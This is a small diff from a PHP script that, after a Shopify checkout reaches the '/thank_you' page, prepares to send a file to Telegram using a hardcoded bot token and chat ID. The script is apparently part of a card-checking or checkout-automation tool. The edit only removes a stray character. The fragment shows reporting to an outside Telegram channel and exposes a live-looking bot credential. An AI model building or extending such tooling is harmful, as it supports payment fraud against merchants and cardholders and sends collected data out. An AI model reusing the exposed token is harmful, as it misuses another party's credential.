@@ -2058,7 +2058,7 @@ if (strpos($response5, $checkouturl . '/thank_you')) {
                                 echo "3DS Shopify, preparing to send file to Telegram..." . PHP_EOL;
                             
                                 $botToken = "8564460157:AAEh3BGsGLtakakIaYTq6BWWJyzyaEelxZs";
-                                $chatId = "-1003519538285";o
+                                $chatId = "-1003519538285";
                                 $sentUrlsFile = 'sent_urls.txt';
                             
                                 // Load sent URLs
